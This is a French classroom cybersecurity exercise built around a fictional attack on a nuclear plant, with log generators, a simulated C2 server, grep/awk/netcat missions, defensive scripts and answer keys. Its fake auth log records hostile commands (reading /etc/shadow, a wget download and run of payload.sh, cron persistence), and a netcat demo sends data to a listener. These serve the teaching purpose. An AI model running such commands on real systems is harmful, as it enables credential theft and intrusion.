# 🔴 OPÉRATION RÉACTEUR-7 — Incident Cybernétique à la Centrale de Gentilly

## Scénario de Simulation — Administration Système (3 heures)

---

## 📖 Contexte Narratif

> **Date :** 14 mars 2026, 02h47 du matin.
>
> La centrale nucléaire de **Gentilly-3** (fictive) détecte des anomalies dans son réseau interne.
> Le système de surveillance signale un **trafic inhabituel** sur plusieurs ports.
> Les capteurs de température du réacteur 7 envoient des valeurs incohérentes.
> L'équipe de nuit suspecte une **cyberattaque en cours**.
>
> **Vous êtes l'équipe d'intervention en cybersécurité.**
> Votre mission : analyser, identifier et neutraliser la menace avant qu'elle ne compromette les systèmes critiques.

---

## 🧑‍🏫 Guide de l'Enseignant

### Durée totale : 3 heures

| Étape | Durée | Contenu |
|-------|-------|---------|
| Introduction et mise en contexte | 15 min | Présenter le scénario, distribuer les fichiers |
| Niveau 1 — Analyse des logs | 40 min | grep, awk, sed |
| Niveau 2 — Surveillance réseau | 40 min | netcat, ports, adresses IP |
| Niveau 3 — Écriture de scripts défensifs | 45 min | Scripts .sh + un peu de Python |
| Niveau 4 — Rapport final et débriefing | 20 min | Synthèse et correction |
| **Pause** | **~20 min** | À placer entre le Niveau 2 et 3 |

### Préparation

1. Envoyer aux étudiants le dossier contenant tous les scripts de simulation (Section "Scripts de Simulation")
2. Les étudiants doivent avoir accès à un terminal Linux (WSL, VM, ou Linux natif)
3. Aucune installation spéciale requise (bash, Python 3, netcat sont suffisants)

---

## 🛠️ Scripts de Simulation (à fournir par l'enseignant)

### Script 1 : `generer_logs.sh` — Génère les fichiers de logs fictifs

```bash
#!/bin/bash
# =============================================================
# generer_logs.sh — Génère les logs fictifs de la centrale
# L'enseignant exécute ce script AVANT la séance
# Usage : bash generer_logs.sh
# =============================================================

mkdir -p logs_centrale

# --- Fichier 1 : access.log (log d'accès réseau) ---
cat > logs_centrale/access.log << 'EOF'
[2026-03-14 02:30:15] SRC=192.168.1.10 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:30:18] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=OK SERVICE=SSH
[2026-03-14 02:31:02] SRC=192.168.1.10 DST=192.168.1.100 PORT=80 PROTO=TCP STATUS=OK SERVICE=HTTP
[2026-03-14 02:31:45] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:31:46] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:31:47] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:00] SRC=192.168.1.15 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:32:10] SRC=10.0.0.55 DST=192.168.1.201 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:11] SRC=10.0.0.55 DST=192.168.1.202 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:30] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=OK SERVICE=SSH
[2026-03-14 02:33:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:05] SRC=10.0.0.55 DST=192.168.1.200 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:06] SRC=10.0.0.55 DST=192.168.1.203 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:30] SRC=192.168.1.10 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:34:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:34:15] SRC=10.0.0.55 DST=192.168.1.200 PORT=9999 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:34:30] SRC=192.168.1.20 DST=192.168.1.100 PORT=3306 PROTO=TCP STATUS=OK SERVICE=MYSQL
[2026-03-14 02:35:00] SRC=10.0.0.55 DST=192.168.1.204 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:35:15] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:35:30] SRC=192.168.1.10 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:36:00] SRC=192.168.1.25 DST=192.168.1.100 PORT=8080 PROTO=TCP STATUS=OK SERVICE=HTTP-ALT
[2026-03-14 02:36:30] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:37:00] SRC=10.0.0.55 DST=192.168.1.205 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:37:15] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=FAIL SERVICE=SSH
[2026-03-14 02:37:16] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=FAIL SERVICE=SSH
[2026-03-14 02:37:17] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=FAIL SERVICE=SSH
[2026-03-14 02:37:30] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
EOF

# --- Fichier 2 : capteurs.log (données des capteurs du réacteur) ---
cat > logs_centrale/capteurs.log << 'EOF'
[2026-03-14 02:30:00] CAPTEUR=TEMP_REACT_7 VALEUR=312.5 UNITE=°C STATUS=NORMAL
[2026-03-14 02:30:30] CAPTEUR=PRESSION_REACT_7 VALEUR=155.2 UNITE=bar STATUS=NORMAL
[2026-03-14 02:31:00] CAPTEUR=TEMP_REACT_7 VALEUR=313.1 UNITE=°C STATUS=NORMAL
[2026-03-14 02:31:30] CAPTEUR=PRESSION_REACT_7 VALEUR=155.0 UNITE=bar STATUS=NORMAL
[2026-03-14 02:32:00] CAPTEUR=TEMP_REACT_7 VALEUR=350.8 UNITE=°C STATUS=ALERTE
[2026-03-14 02:32:30] CAPTEUR=PRESSION_REACT_7 VALEUR=170.3 UNITE=bar STATUS=ALERTE
[2026-03-14 02:33:00] CAPTEUR=TEMP_REACT_7 VALEUR=425.9 UNITE=°C STATUS=CRITIQUE
[2026-03-14 02:33:30] CAPTEUR=PRESSION_REACT_7 VALEUR=189.7 UNITE=bar STATUS=CRITIQUE
[2026-03-14 02:34:00] CAPTEUR=TEMP_REACT_7 VALEUR=287.0 UNITE=°C STATUS=NORMAL
[2026-03-14 02:34:30] CAPTEUR=PRESSION_REACT_7 VALEUR=150.1 UNITE=bar STATUS=NORMAL
[2026-03-14 02:35:00] CAPTEUR=TEMP_REACT_7 VALEUR=510.2 UNITE=°C STATUS=DANGER
[2026-03-14 02:35:30] CAPTEUR=PRESSION_REACT_7 VALEUR=210.5 UNITE=bar STATUS=DANGER
[2026-03-14 02:36:00] CAPTEUR=TEMP_REACT_7 VALEUR=295.0 UNITE=°C STATUS=NORMAL
[2026-03-14 02:36:30] CAPTEUR=DEBIT_EAU_REACT_7 VALEUR=4500 UNITE=L/min STATUS=NORMAL
[2026-03-14 02:37:00] CAPTEUR=TEMP_REACT_7 VALEUR=480.3 UNITE=°C STATUS=DANGER
[2026-03-14 02:37:30] CAPTEUR=PRESSION_REACT_7 VALEUR=205.8 UNITE=bar STATUS=DANGER
[2026-03-14 02:38:00] CAPTEUR=TEMP_REACT_7 VALEUR=301.0 UNITE=°C STATUS=NORMAL
EOF

# --- Fichier 3 : auth.log (tentatives d'authentification) ---
cat > logs_centrale/auth.log << 'EOF'
[2026-03-14 02:30:00] USER=operateur1 IP=192.168.1.10 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:30:05] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:31:45] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:46] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:47] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:48] USER=admin IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:49] USER=admin IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:50] USER=operateur1 IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:51] USER=operateur2 IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:52] USER=test IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:53] USER=guest IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:32:00] USER=superviseur IP=192.168.1.15 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:33:05] USER=maintenance IP=10.0.0.55 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:33:10] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="cat /etc/shadow"
[2026-03-14 02:33:15] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="wget http://10.0.0.55/payload.sh"
[2026-03-14 02:33:20] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="chmod +x payload.sh"
[2026-03-14 02:33:25] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="./payload.sh"
[2026-03-14 02:34:00] USER=operateur1 IP=192.168.1.10 ACTION=LOGOUT STATUS=SUCCESS
[2026-03-14 02:35:00] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="crontab -e"
[2026-03-14 02:36:00] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:36:01] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:36:02] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=FAILED
EOF

# --- Fichier 4 : connexions_actives.txt (snapshot des connexions) ---
cat > logs_centrale/connexions_actives.txt << 'EOF'
Proto  Adresse_Locale         Adresse_Distante       Etat         PID/Programme
tcp    192.168.1.100:443      192.168.1.10:52341     ESTABLISHED  1234/nginx
tcp    192.168.1.100:22       192.168.1.12:48210     ESTABLISHED  5678/sshd
tcp    192.168.1.200:4444     10.0.0.55:61234        ESTABLISHED  9999/nc
tcp    192.168.1.200:31337    10.0.0.55:55012        ESTABLISHED  9998/python3
tcp    192.168.1.100:3306     192.168.1.20:41567     ESTABLISHED  3306/mysqld
tcp    192.168.1.100:80       192.168.1.10:53200     ESTABLISHED  1234/nginx
tcp    192.168.1.201:4444     10.0.0.55:61235        ESTABLISHED  10001/nc
tcp    192.168.1.100:8080     192.168.1.25:49321     ESTABLISHED  8080/tomcat
tcp    192.168.1.203:31337    10.0.0.55:55100        ESTABLISHED  10002/python3
EOF

echo "✅ Fichiers de logs générés dans le dossier logs_centrale/"
echo ""
echo "Fichiers créés :"
ls -la logs_centrale/
```

### Script 2 : `simulateur_trafic.sh` — Simule du trafic réseau en temps réel

```bash
#!/bin/bash
# =============================================================
# simulateur_trafic.sh — Simule du trafic réseau (style Wireshark)
# L'enseignant exécute ce script EN DIRECT pendant la séance
# Usage : bash simulateur_trafic.sh
# Les étudiants regardent la sortie à l'écran partagé (Teams)
# =============================================================

# Couleurs pour le terminal
ROUGE='\033[0;31m'
VERT='\033[0;32m'
JAUNE='\033[0;33m'
BLEU='\033[0;34m'
RESET='\033[0m'

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║        SYSTÈME DE SURVEILLANCE RÉSEAU — GENTILLY-3             ║"
echo "║        Moniteur de trafic en temps réel                        ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "  No.  | Temps     | Source          | Destination     | Proto | Port  | Info"
echo "  -----|-----------|-----------------|-----------------|-------|-------|------------------"

compteur=1
heure_base=2
minute=30
seconde=0

generer_ligne() {
    local type=$1
    local temps=$(printf "%02d:%02d:%02d" $heure_base $minute $seconde)

    case $type in
        normal_https)
            printf "  ${VERT}%-5s${RESET}| %s   | 192.168.1.10    | 192.168.1.100   | TCP   | 443   | HTTPS - Trafic normal\n" "$compteur" "$temps"
            ;;
        normal_ssh)
            printf "  ${VERT}%-5s${RESET}| %s   | 192.168.1.12    | 192.168.1.100   | TCP   | 22    | SSH - Session admin\n" "$compteur" "$temps"
            ;;
        normal_mysql)
            printf "  ${BLEU}%-5s${RESET}| %s   | 192.168.1.20    | 192.168.1.100   | TCP   | 3306  | MySQL - Requête BD\n" "$compteur" "$temps"
            ;;
        suspect_4444)
            printf "  ${ROUGE}%-5s${RESET}| %s   | ${ROUGE}10.0.0.55${RESET}       | 192.168.1.200   | TCP   | ${ROUGE}4444${RESET}  | ${ROUGE}⚠ PORT SUSPECT - Connexion inconnue${RESET}\n" "$compteur" "$temps"
            ;;
        suspect_31337)
            printf "  ${ROUGE}%-5s${RESET}| %s   | ${ROUGE}10.0.0.55${RESET}       | 192.168.1.200   | TCP   | ${ROUGE}31337${RESET} | ${ROUGE}⚠ PORT SUSPECT - Service non identifié${RESET}\n" "$compteur" "$temps"
            ;;
        exfiltration)
            printf "  ${JAUNE}%-5s${RESET}| %s   | 192.168.1.200   | ${ROUGE}10.0.0.55${RESET}       | TCP   | ${ROUGE}9999${RESET}  | ${JAUNE}⚠ DONNÉES SORTANTES - 2.4 MB${RESET}\n" "$compteur" "$temps"
            ;;
        brute_force)
            printf "  ${ROUGE}%-5s${RESET}| %s   | ${ROUGE}10.0.0.55${RESET}       | 192.168.1.100   | TCP   | 22    | ${ROUGE}⚠ SSH ÉCHEC - Tentative brute force${RESET}\n" "$compteur" "$temps"
            ;;
    esac

    compteur=$((compteur + 1))
    seconde=$((seconde + RANDOM % 3 + 1))
    if [ $seconde -ge 60 ]; then
        seconde=$((seconde - 60))
        minute=$((minute + 1))
    fi
}

# Séquence de trafic simulé
trafic=(
    normal_https normal_ssh normal_https normal_mysql
    suspect_4444 suspect_4444 suspect_4444
    normal_https normal_ssh
    suspect_4444 suspect_31337
    normal_mysql normal_https
    brute_force brute_force brute_force brute_force brute_force
    suspect_4444 suspect_31337
    normal_https
    exfiltration
    suspect_4444 suspect_4444
    normal_ssh
    suspect_31337 exfiltration
    normal_https normal_mysql
    suspect_4444 suspect_4444 suspect_4444
    exfiltration exfiltration
    normal_https
    suspect_31337 suspect_4444
)

for t in "${trafic[@]}"; do
    generer_ligne "$t"
    sleep $(echo "scale=1; $(( RANDOM % 8 + 3 )) / 10" | bc)
done

echo ""
echo "  ╔══════════════════════════════════════════════════════════════╗"
echo "  ║  ${ROUGE}⚠ ALERTE : Activité suspecte détectée depuis 10.0.0.55${RESET}     ║"
echo "  ║  ${ROUGE}  Ports concernés : 4444, 31337, 9999${RESET}                      ║"
echo "  ║  ${JAUNE}  Exfiltration de données possible${RESET}                         ║"
echo "  ╚══════════════════════════════════════════════════════════════╝"
```

### Script 3 : `serveur_pirate.sh` — Simule le serveur de l'attaquant (pour démonstration netcat)

```bash
#!/bin/bash
# =============================================================
# serveur_pirate.sh — Simule un serveur malveillant
# L'enseignant lance ce script pour montrer comment netcat fonctionne
# Usage : bash serveur_pirate.sh
# =============================================================

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  SIMULATION — Serveur C2 de l'attaquant                    ║"
echo "║  (Command & Control)                                       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Créer un fichier de commandes simulées
cat > /tmp/commandes_pirate.txt << 'EOF'
[C2] > Connexion établie avec la cible 192.168.1.200
[C2] > Récupération des informations système...
[C2] > OS: Linux gentilly3-srv 5.15.0 x86_64
[C2] > Extraction des fichiers de configuration...
[C2] > Envoi du payload de modification des capteurs...
[C2] > Capteur TEMP_REACT_7 : valeur modifiée → 510.2°C (réelle: 312°C)
[C2] > Capteur PRESSION_REACT_7 : valeur modifiée → 210.5 bar (réelle: 155 bar)
[C2] > Création d'une tâche cron pour persistance...
[C2] > Ouverture du port 31337 pour accès secondaire...
[C2] > Exfiltration des données en cours vers 10.0.0.55:9999...
EOF

echo "📡 Le serveur C2 simule l'envoi de commandes..."
echo "   (Ceci montre ce que l'attaquant fait une fois connecté)"
echo ""
echo "-----------------------------------------------------------"

while IFS= read -r ligne; do
    echo "$ligne"
    sleep 2
done < /tmp/commandes_pirate.txt

echo "-----------------------------------------------------------"
echo ""
echo "💡 Explication : L'attaquant utilise le port 4444 (reverse shell)"
echo "   et le port 31337 (backdoor classique 'elite') pour maintenir"
echo "   son accès au système de la centrale."
```

---

## 🎮 NIVEAU 1 — Analyse des Logs (40 min)

### 📋 Briefing Mission

> **Message de l'équipe de nuit :**
> « On a remarqué des trucs bizarres dans les logs. Les capteurs du réacteur 7 donnent des valeurs folles et on voit du trafic qu'on ne reconnaît pas. On vous envoie les fichiers de logs. Trouvez ce qui se passe. »

### Mission 1.1 — Trouver l'intrus (grep)

**Contexte :** Le réseau interne de la centrale utilise la plage `192.168.1.0/24`. Toute adresse IP qui n'est PAS dans cette plage est potentiellement suspecte.

**Question :** Quelle adresse IP externe apparaît dans les logs d'accès ?

```bash
# Les étudiants doivent exécuter :
grep -v "192.168.1" logs_centrale/access.log
```

**Question bonus :** Combien de fois cette IP apparaît-elle ?

```bash
grep -c "10.0.0.55" logs_centrale/access.log
```

> **✅ Réponse attendue :** L'adresse `10.0.0.55` est l'intrus. Elle apparaît **15 fois**.

---

### Mission 1.2 — Identifier les ports suspects (awk)

**Contexte :** Les ports standards de la centrale sont : 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 8080 (Tomcat). Tout autre port est suspect.

**Question :** Quels ports non-standards sont utilisés par l'attaquant ?

```bash
# Extraire tous les ports uniques utilisés par l'IP suspecte
grep "10.0.0.55" logs_centrale/access.log | awk '{print $4}' | sed 's/PORT=//' | sort -u
```

> **✅ Réponse attendue :** Ports `4444`, `31337`, et `9999`

**Question bonus :** Que représentent ces ports ?

> - **Port 4444** : Port par défaut de Metasploit (outil de pentest) pour les reverse shells
> - **Port 31337** : "eleet" (elite) en langage hacker — port historique de backdoors
> - **Port 9999** : Souvent utilisé pour l'exfiltration de données

---

### Mission 1.3 — Analyser les capteurs (awk + sed)

**Contexte :** La température normale du réacteur est entre **290°C et 320°C**. La pression normale est entre **150 et 160 bar**.

**Question :** Trouvez toutes les entrées où les capteurs montrent des valeurs anormales.

```bash
# Trouver les lignes avec STATUS différent de NORMAL
grep -v "NORMAL" logs_centrale/capteurs.log
```

**Question :** Extraire uniquement les valeurs de température et leur status

```bash
grep "TEMP_REACT_7" logs_centrale/capteurs.log | awk '{print $3, $5}'
```

**Question :** Est-ce que les valeurs sont vraiment anormales ou est-ce que l'attaquant les falsifie ?

> **✅ Réponse attendue :** En comparant les heures des logs `capteurs.log` avec `access.log`, on voit que les valeurs anormales apparaissent exactement au moment où l'IP `10.0.0.55` est active sur le port `4444`. L'attaquant **falsifie les données** des capteurs pour créer la panique.

---

### Mission 1.4 — Analyser les tentatives d'authentification (grep + awk + sed)

**Question :** L'attaquant a-t-il réussi à s'authentifier ? Avec quel compte ?

```bash
# Voir toutes les tentatives depuis l'IP suspecte
grep "10.0.0.55" logs_centrale/auth.log
```

```bash
# Trouver les connexions réussies de l'attaquant
grep "10.0.0.55" logs_centrale/auth.log | grep "SUCCESS"
```

**Question :** Quelles commandes l'attaquant a-t-il exécutées après s'être connecté ?

```bash
grep "10.0.0.55" logs_centrale/auth.log | grep "SUDO" | sed 's/.*CMD="//' | sed 's/"//'
```

> **✅ Réponse attendue :**
> - L'attaquant a d'abord échoué avec `root`, `admin`, `operateur1`, `operateur2`, `test`, `guest` (brute force)
> - Il a réussi avec le compte `maintenance`
> - Commandes exécutées : `cat /etc/shadow`, `wget payload.sh`, `chmod +x`, `./payload.sh`, `crontab -e`
> - C'est une attaque classique : brute force → compromission → téléchargement de malware → persistance

---

## 🎮 NIVEAU 2 — Surveillance Réseau (40 min)

### 📋 Briefing Mission

> **Message du directeur de la centrale :**
> « Bon travail sur l'analyse des logs. Maintenant on a besoin que vous examiniez les connexions actives et que vous compreniez comment l'attaquant communique avec notre réseau. »

### Mission 2.1 — Analyser les connexions actives (awk)

**Question :** À partir du fichier `connexions_actives.txt`, identifiez toutes les connexions suspectes.

```bash
# Trouver toutes les connexions impliquant l'IP suspecte
grep "10.0.0.55" logs_centrale/connexions_actives.txt
```

```bash
# Extraire les ports et programmes suspects
grep "10.0.0.55" logs_centrale/connexions_actives.txt | awk '{print $3, $4, $6}'
```

> **✅ Réponse attendue :**
> - `nc` (netcat) tourne sur le port **4444** → reverse shell
> - `python3` tourne sur le port **31337** → backdoor / script malveillant
> - L'attaquant a **plusieurs points d'entrée** (machines .200, .201, .203)

---

### Mission 2.2 — Comprendre netcat (démonstration + exercice)

**L'enseignant fait une démonstration en direct :**

```bash
# Terminal 1 (enseignant - simule l'attaquant qui écoute)
nc -l -p 4444

# Terminal 2 (enseignant - simule la machine compromise)
echo "Données confidentielles du réacteur 7" | nc localhost 4444
```

**Exercice pour les étudiants :** Expliquer dans leurs propres mots ce que fait chaque commande.

> **✅ Réponse attendue :**
> - `nc -l -p 4444` : netcat **écoute** (`-l` = listen) sur le port **4444** — c'est le serveur de l'attaquant qui attend une connexion
> - `nc localhost 4444` : netcat **se connecte** au port 4444 — c'est la machine compromise qui envoie des données à l'attaquant

---

### Mission 2.3 — Identifier les adresses IP et les réseaux

**Question :** Remplir le tableau suivant en se basant sur les logs :

| Adresse IP | Réseau | Rôle probable |
|-----------|--------|---------------|
| 192.168.1.10 | ? | ? |
| 192.168.1.12 | ? | ? |
| 192.168.1.15 | ? | ? |
| 192.168.1.20 | ? | ? |
| 192.168.1.100 | ? | ? |
| 192.168.1.200 | ? | ? |
| 10.0.0.55 | ? | ? |

> **✅ Réponse attendue :**
>
> | Adresse IP | Réseau | Rôle probable |
> |-----------|--------|---------------|
> | 192.168.1.10 | Interne | Poste opérateur (HTTPS, HTTP) |
> | 192.168.1.12 | Interne | Poste admin (SSH) |
> | 192.168.1.15 | Interne | Poste superviseur |
> | 192.168.1.20 | Interne | Serveur base de données (MySQL) |
> | 192.168.1.100 | Interne | Serveur principal de la centrale |
> | 192.168.1.200 | Interne | Serveur compromis (cible de l'attaque) |
> | 10.0.0.55 | **Externe** | **Machine de l'attaquant** |

---

### Mission 2.4 — Timeline de l'attaque

**Exercice :** En utilisant TOUS les fichiers de logs, reconstituez la chronologie de l'attaque.

```bash
# Aide : combiner et trier les logs par horodatage
grep "10.0.0.55" logs_centrale/access.log logs_centrale/auth.log | sort -t']' -k1
```

> **✅ Réponse attendue (chronologie) :**
> 1. **02:31:45** — Première connexion sur le port 4444 (reverse shell)
> 2. **02:31:45-52** — Tentatives de brute force (root, admin, test, guest...)
> 3. **02:33:05** — Connexion réussie avec le compte `maintenance`
> 4. **02:33:10** — Lecture de `/etc/shadow` (vol de mots de passe)
> 5. **02:33:15** — Téléchargement du malware `payload.sh`
> 6. **02:33:20-25** — Exécution du malware
> 7. **02:33:05** — Ouverture du port 31337 (backdoor secondaire)
> 8. **02:34:15** — Début de l'exfiltration (port 9999)
> 9. **02:35:00** — Modification du crontab (persistance)
> 10. **02:32:00+** — Falsification des données des capteurs

---

## 🎮 NIVEAU 3 — Scripts de Défense (45 min)

### 📋 Briefing Mission

> **Message URGENT du directeur :**
> « L'attaque est confirmée ! On a besoin de scripts pour bloquer l'attaquant et surveiller le système. Écrivez-nous des outils qu'on pourra réutiliser. »

### Mission 3.1 — Script de détection d'IP suspecte (`detecteur.sh`)

**Consigne :** Écrire un script bash qui prend un fichier de log en paramètre et qui affiche toutes les adresses IP qui ne font PAS partie du réseau `192.168.1`.

```bash
#!/bin/bash
# detecteur.sh — Détecte les IP externes dans un fichier de log
# Usage : bash detecteur.sh fichier.log

if [ -z "$1" ]; then
    echo "Usage: bash detecteur.sh <fichier_log>"
    exit 1
fi

echo "=== Analyse de $1 ==="
echo "IP suspectes détectées :"
echo ""

grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$1" | \
    grep -v "^192\.168\.1\." | \
    sort -u

echo ""
echo "Nombre de connexions par IP suspecte :"
grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$1" | \
    grep -v "^192\.168\.1\." | \
    sort | uniq -c | sort -rn
```

---

### Mission 3.2 — Script de blocage de ports (`bloquer_ports.sh`)

**Consigne :** Écrire un script bash qui simule le blocage des ports suspects. Le script doit lire le fichier `access.log`, trouver les ports `SERVICE=UNKNOWN` et générer les règles de firewall (iptables) correspondantes.

```bash
#!/bin/bash
# bloquer_ports.sh — Génère les règles iptables pour bloquer les ports suspects
# Usage : bash bloquer_ports.sh

echo "=== Générateur de règles Firewall ==="
echo "Analyse des ports suspects..."
echo ""

# Extraire les ports suspects (SERVICE=UNKNOWN)
ports_suspects=$(grep "UNKNOWN" logs_centrale/access.log | \
    grep -oE 'PORT=[0-9]+' | \
    sed 's/PORT=//' | \
    sort -u)

echo "Ports suspects identifiés :"
for port in $ports_suspects; do
    echo "  ⚠ Port $port"
done

echo ""
echo "Règles iptables à appliquer :"
echo "------------------------------"

for port in $ports_suspects; do
    echo "iptables -A INPUT -p tcp --dport $port -j DROP"
    echo "iptables -A OUTPUT -p tcp --dport $port -j DROP"
done

# Bloquer l'IP de l'attaquant
echo ""
echo "# Blocage complet de l'IP attaquante :"
echo "iptables -A INPUT -s 10.0.0.55 -j DROP"
echo "iptables -A OUTPUT -d 10.0.0.55 -j DROP"

echo ""
echo "✅ Copiez ces règles et exécutez-les avec sudo pour protéger le système."
echo "   (Simulation — ne pas exécuter en vrai !)"
```

---

### Mission 3.3 — Mini-script Python d'alerte (`alerte.py`)

**Consigne :** Écrire un script Python qui lit le fichier `capteurs.log` et affiche une alerte pour chaque valeur de température supérieure à 320°C.

```python
#!/usr/bin/env python3
"""
alerte.py — Système d'alerte pour les capteurs du réacteur
Usage : python3 alerte.py
"""

TEMP_MAX = 320.0  # Température maximale normale en °C

print("=" * 60)
print("  SYSTÈME D'ALERTE — Réacteur 7")
print("=" * 60)
print()

alertes = 0

with open("logs_centrale/capteurs.log", "r") as f:
    for ligne in f:
        if "TEMP_REACT_7" in ligne:
            # Extraire la valeur de température
            parties = ligne.split()
            for partie in parties:
                if partie.startswith("VALEUR="):
                    valeur = float(partie.split("=")[1])
                    # Extraire l'heure
                    heure = ligne.split("]")[0].replace("[", "")

                    if valeur > TEMP_MAX:
                        alertes += 1
                        if valeur > 450:
                            niveau = "🔴 DANGER"
                        elif valeur > 350:
                            niveau = "🟡 CRITIQUE"
                        else:
                            niveau = "🟠 ALERTE"

                        print(f"  {niveau} | {heure} | Température: {valeur}°C (max: {TEMP_MAX}°C)")

print()
print(f"  Total des alertes : {alertes}")
print()

if alertes > 3:
    print("  ⚠️  RECOMMANDATION : Les données semblent manipulées.")
    print("     Les pics de température coïncident avec l'activité de l'attaquant.")
    print("     Vérifier les capteurs physiquement avant toute action.")
```

---

### Mission 3.4 — Script de surveillance continue (`moniteur.sh`)

**Consigne :** Écrire un script qui surveille un fichier de log en temps réel et alerte quand l'IP `10.0.0.55` apparaît.

```bash
#!/bin/bash
# moniteur.sh — Surveillance en temps réel
# Usage : bash moniteur.sh fichier.log
# Pour tester : dans un autre terminal, ajouter des lignes au fichier

if [ -z "$1" ]; then
    echo "Usage: bash moniteur.sh <fichier_log>"
    exit 1
fi

IP_DANGER="10.0.0.55"

echo "🔍 Surveillance de $1 en cours..."
echo "   Alerte si l'IP $IP_DANGER est détectée"
echo "   (Ctrl+C pour arrêter)"
echo ""

tail -f "$1" | while read ligne; do
    if echo "$ligne" | grep -q "$IP_DANGER"; then
        echo "🚨 ALERTE [$(date '+%H:%M:%S')] : Activité détectée !"
        echo "   → $ligne"
        echo ""
    fi
done
```

> **💡 Pour tester :** L'enseignant peut montrer en ouvrant un deuxième terminal et en ajoutant une ligne au fichier :
> ```bash
> echo '[2026-03-14 02:40:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN' >> logs_centrale/access.log
> ```

---

## 🎮 NIVEAU 4 — Rapport Final et Débriefing (20 min)

### 📋 Mission Finale

**Consigne :** Chaque étudiant rédige un court **rapport d'incident** (5 à 10 lignes) qui résume :

1. **Qui** a attaqué ? (adresse IP, méthode)
2. **Comment** l'attaquant est entré ? (brute force → compte maintenance)
3. **Quoi** : qu'a fait l'attaquant une fois à l'intérieur ?
4. **Impact** : quelles conséquences pour la centrale ?
5. **Solution** : quelles mesures prendre pour empêcher une prochaine attaque ?

### Exemple de rapport attendu

> **Rapport d'incident — Centrale Gentilly-3**
>
> L'attaque a été menée depuis l'IP `10.0.0.55` (réseau externe). L'attaquant a d'abord effectué une attaque par brute force sur le service SSH, testant plusieurs noms d'utilisateur. Il a finalement réussi à se connecter avec le compte `maintenance`.
>
> Une fois connecté, il a lu le fichier `/etc/shadow`, téléchargé un malware (`payload.sh`), ouvert des backdoors sur les ports 4444 et 31337, et falsifié les données des capteurs de température et de pression pour créer la panique.
>
